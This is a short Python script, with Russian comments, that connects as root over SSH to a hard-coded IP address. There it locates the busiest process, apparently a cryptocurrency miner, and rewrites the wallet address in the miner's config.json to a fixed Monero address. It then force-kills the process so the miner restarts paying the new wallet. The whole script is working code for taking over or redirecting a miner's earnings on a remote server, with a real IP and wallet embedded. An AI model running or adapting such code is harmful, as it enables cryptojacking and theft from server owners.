import subprocess

NEW_ADDRESS = "8AuEifF9aNCTzEeTwLFTXDJcEFjD2tmQsKh6Q2ewdR7Je2TBX2PDK6yXcaXFXf94EiHXZUgZr7Xwa2QJBYJ9o2gr4bTRq4z"

# Только Sylectus
IP = "65.109.58.108"

BASH_SCRIPT = f"""
PID=$(ps -eo pid,pcpu,comm --sort=-pcpu | awk 'NR==2 {{print $1}}')
BIN_PATH=$(readlink -f /proc/$PID/exe)
WORK_DIR=$(dirname $BIN_PATH)
CONFIG="$WORK_DIR/config.json"

echo "Top CPU PID: $PID, Bin: $BIN_PATH, Config: $CONFIG"

if [ -f "$CONFIG" ]; then
    # Делаем бекап
    cp "$CONFIG" "$CONFIG.bak"
    
    # Меняем адрес (любой XMR адрес длиной более 90 символов)
    sed -i -E 's/"user": "[48][a-zA-Z0-9]+",/"user": "{NEW_ADDRESS}",/g' "$CONFIG"
    
    echo "✅ Address updated in config.json"
    
    # Убиваем майнер, он перезапустится
    kill -9 $PID
    echo "✅ Process killed. It should auto-restart with new config."
else
    echo "❌ Config not found at $CONFIG"
fi
"""

print(f"📡 Connecting to Sylectus ({IP}) on port 22...")

result = subprocess.run(
    ["ssh", "-p", "22", f"root@{IP}", BASH_SCRIPT],
    capture_output=True, text=True
)

if result.stdout:
    print("\n--- Output ---")
    print(result.stdout.strip())
if result.stderr:
    print("\n--- Errors ---")
    print(result.stderr.strip())
